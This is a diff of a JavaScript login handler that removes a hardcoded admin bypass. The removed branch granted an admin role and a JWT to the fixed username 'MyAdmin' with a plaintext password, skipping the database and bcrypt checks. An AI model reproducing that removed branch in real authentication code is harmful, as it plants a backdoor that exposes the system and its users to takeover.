@@ -63,24 +63,8 @@ export const loginUser = async (req, res) => {
   try {
     const { username, password } = req.body;
     const user = await User.findOne({ username });
-    if (username === "MyAdmin" && password === "my-real-secure-password") {
-      const adminUser = {
-        _id: "admin-id-001", // can be any placeholder ID
-        username: "MyAdmin",
-        email: "admin@example.com",
-        role: "admin",
-      };
-
-      const token = generateToken(adminUser._id);
-      res.cookie("jwt", token, cookieOptions);
-
-      return res.status(200).json({
-        _id: adminUser._id,
-        username: adminUser.username,
-        email: adminUser.email,
-        role: adminUser.role,
-      });
-    } else if (user && (await bcrypt.compare(password, user.password))) {
+    
+    if (user && (await bcrypt.compare(password, user.password))) {
       const token = generateToken(user._id);
       res.cookie("jwt", token, cookieOptions);
 
